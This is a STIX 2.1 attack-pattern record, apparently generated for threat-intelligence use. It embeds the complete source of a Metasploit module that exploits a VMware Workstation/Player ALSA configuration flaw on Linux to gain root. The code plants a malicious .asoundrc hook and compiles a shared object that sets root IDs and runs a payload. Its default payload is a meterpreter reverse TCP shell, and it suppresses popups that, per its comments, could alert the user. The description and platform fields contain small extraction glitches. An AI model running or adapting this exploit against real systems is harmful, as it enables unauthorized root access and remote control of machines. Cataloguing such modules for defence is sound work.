{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1c159b9-05bd-462d-b5ef-2e8e29af74c8",
    "created": "2024-08-14T16:59:40.860031Z",
    "modified": "2024-08-14T16:59:40.860035Z",
    "name": "VMware Workstation ALSA Config File Local Privilege Escalation",
    "description": " This module exploits a vulnerability in VMware Workstation Pro and Player on Linux which allows users to escalate their privileges by using an ALSA configuration file to load and execute a shared object as root when launching a virtual machine with an attached sound card.  This module has been tested successfully on VMware Player version 12.5.0 on Debian Linux 8 Jessie.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vmware_alsa_config.rb",
            "external_id": "vmware_alsa_config.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.securitytracker.com/id/1038525"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/bcoles/cd26a831473088afafefc93641e184a9"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2017-0009.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1142"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VMware Workstation ALSA Config File Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in VMware Workstation Pro and\n        Player on Linux which allows users to escalate their privileges by\n        using an ALSA configuration file to load and execute a shared object\n        as root when launching a virtual machine with an attached sound card.\n\n        This module has been tested successfully on VMware Player version\n        12.5.0 on Debian Linux 8 Jessie.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2017-4915' ],\n          [ 'EDB', '42045' ],\n          [ 'BID', '98566' ],\n          [ 'URL', 'https://www.securitytracker.com/id/1038525' ],\n          [ 'URL', 'https://gist.github.com/bcoles/cd26a831473088afafefc93641e184a9' ],\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2017-0009.html' ],\n          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1142' ]\n        ],\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jann Horn',    # Discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2017-05-22',\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'AppendExit'  => true,\n          'PrependFork' => true,\n          'WfsDelay'    => 30,\n          'Payload'     => 'linux/x64/meterpreter_reverse_tcp'\n        },\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Privileged'     => true,\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'DefaultTarget'  => 1))\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),\n      OptString.new('Xdisplay', [true, 'Display exploit will attempt to use', ':0'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating '#{path}' directory\"\n    cmd_exec \"mkdir -p #{path}\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def upload_and_compile(path, data, gcc_args='')\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n\n    unless gcc_args.to_s.blank?\n      gcc_cmd << \" #{gcc_args}\"\n    end\n\n    output = cmd_exec gcc_cmd\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n    chmod path\n  end\n\n  def check\n    unless command_exists? '/usr/bin/vmplayer'\n      print_error 'vmplayer is not installed. Exploitation will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'vmplayer is installed'\n\n    unless has_gcc?\n      print_error 'gcc is not installed. Compiling will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    config = read_file('/etc/vmware/config') rescue ''\n    if config =~ /player\\.product\\.version\\s*=\\s*\"([\\d\\.]+)\"/\n      version = Rex::Version.new $1.gsub(/\\.$/, '')\n      vprint_status \"VMware is version #{version}\"\n    else\n      vprint_error 'Could not determine VMware version.'\n      return CheckCode::Detected\n    end\n\n    if version >= Rex::Version.new('12.5.6')\n      vprint_error 'Target version is not vulnerable'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    home_dir = cmd_exec 'PATH=$PATH:/usr/bin getent passwd `id -un` | cut -d: -f6'\n    if home_dir.blank?\n      fail_with Failure::Unknown, \"Could not find user's home directory\"\n    end\n\n    unless writable? home_dir\n      fail_with Failure::BadConfig, \"#{home_dir} is not writable\"\n    end\n\n    # Create a directory for the virtual machine and associated files\n    vmx_name = rand_text_alphanumeric(10..15)\n    vm_dir = \"#{base_dir}/#{vmx_name}\"\n    mkdir vm_dir\n\n    # Create shared object\n    payload_name = rand_text_alphanumeric(10..15)\n    so_name = rand_text_alphanumeric(10..15)\n    so = <<-EOF\n/*\nSource: https://bugs.chromium.org/p/project-zero/issues/detail?id=1142\nOriginal shared object code by jhorn\n*/\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <err.h>\n\nextern char *program_invocation_short_name;\n\n__attribute__((constructor)) void run(void) {\n  uid_t ruid, euid, suid;\n  if (getresuid(&ruid, &euid, &suid))\n    err(1, \"getresuid\");\n  if (ruid == 0 || euid == 0 || suid == 0) {\n    if (setresuid(0, 0, 0) || setresgid(0, 0, 0))\n      err(1, \"setresxid\");\n    system(\"#{vm_dir}/#{payload_name}\");\n    _exit(0);\n  }\n}\nEOF\n\n    upload_and_compile \"#{vm_dir}/#{so_name}.so\", strip_comments(so), '-fPIC -shared -Wall -ldl -std=gnu99'\n\n    # Create virtual machine\n    vmx = <<-EOF\n.encoding = \"UTF-8\"\nconfig.version = \"8\"\nvirtualHW.version = \"8\"\nscsi0.present = \"FALSE\"\nmemsize = \"4\"\nide0:0.present = \"FALSE\"\nsound.present = \"TRUE\"\nsound.fileName = \"-1\"\nsound.autodetect = \"TRUE\"\nvmci0.present = \"FALSE\"\nhpet0.present = \"FALSE\"\ndisplayName = \"#{vmx_name}\"\nguestOS = \"other\"\nnvram = \"#{vmx_name}.nvram\"\nvirtualHW.productCompatibility = \"hosted\"\ngui.exitOnCLIHLT = \"FALSE\"\npowerType.powerOff = \"soft\"\npowerType.powerOn = \"soft\"\npowerType.suspend = \"soft\"\npowerType.reset = \"soft\"\nfloppy0.present = \"FALSE\"\nmonitor_control.disable_longmode = 1\nEOF\n\n    upload \"#{vm_dir}/#{vmx_name}.vmx\", vmx\n    upload_and_chmodx \"#{vm_dir}/#{payload_name}\", generate_payload_exe\n\n    # Create ALSA sound config\n    asoundrc = <<-EOF\nhook_func.pulse_load_if_running {\n  lib \"#{vm_dir}/#{so_name}.so\"\n  func \"conf_pulse_hook_load_if_running\"\n}\nEOF\n\n    upload \"#{home_dir}/.asoundrc\", asoundrc\n\n    # Hint popups must be disabled.\n    # Popups may cause the VMplayer process to hang open, awaiting input. They may also alert the user.\n    # Also, firstRunDismissedVersion must be set to prevent registration popups on a fresh install.\n    #\n    # VMware uses '~' to determine the user's home directory when reading the preferences file:\n    #   stat(\"~/.vmware/preferences\", 0x7fffd18da340) = -1 ENOENT (No such file or directory)\n    #   open(\"~/.vmware/preferences\", O_RDONLY) = -1 ENOENT (No such file or directory)\n    #\n    # If we're executing in a shell without '~' expansion,\n    # then we'll need to create this directory in the current working directory.\n    vprint_status 'Disabling VMware popups...'\n\n    unless cmd_exec(\"test -d ~ && echo true\").include? 'true'\n      mkdir '~'\n    end\n    unless cmd_exec(\"test -d ~/.vmware && echo true\").include? 'true'\n      mkdir '~/.vmware'\n    end\n\n    # Expand '~' to the appropriate full directory path and parse preferences\n    prefs_file = cmd_exec \"PATH=$PATH:/usr/bin realpath ~/.vmware/preferences\"\n    unless file? prefs_file\n      cmd_exec \"touch #{prefs_file}\"\n      register_file_for_cleanup prefs_file\n    end\n\n    prefs = cmd_exec(\"cat #{prefs_file}\").to_s\n    if prefs.blank?\n      prefs = \".encoding = \\\"UTF8\\\"\\n\"\n      prefs << \"pref.vmplayer.firstRunDismissedVersion = \\\"999\\\"\\n\"\n      prefs << \"hints.hideAll = \\\"TRUE\\\"\\n\"\n    elsif prefs =~ /hints\\.hideAll/i\n      prefs.gsub!(/hints\\.hideAll.*$/i, 'hints.hideAll = \"TRUE\"')\n    else\n      prefs.sub!(/\\n?\\z/, \"\\nhints.hideAll = \\\"TRUE\\\"\\n\")\n    end\n    vprint_status \"Writing config file: #{prefs_file}\"\n    write_file prefs_file, prefs\n\n    # Launch VMware in the background to prevent the existing session from dying\n    print_status 'Launching VMware Player...'\n    cmd_exec \"DISPLAY=#{datastore['Xdisplay']} PATH=$PATH:/usr/bin vmplayer #{vm_dir}/#{vmx_name}.vmx & echo \"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-05-22",
    "x_mitre_platforms": [
        "linux'"
    ]
}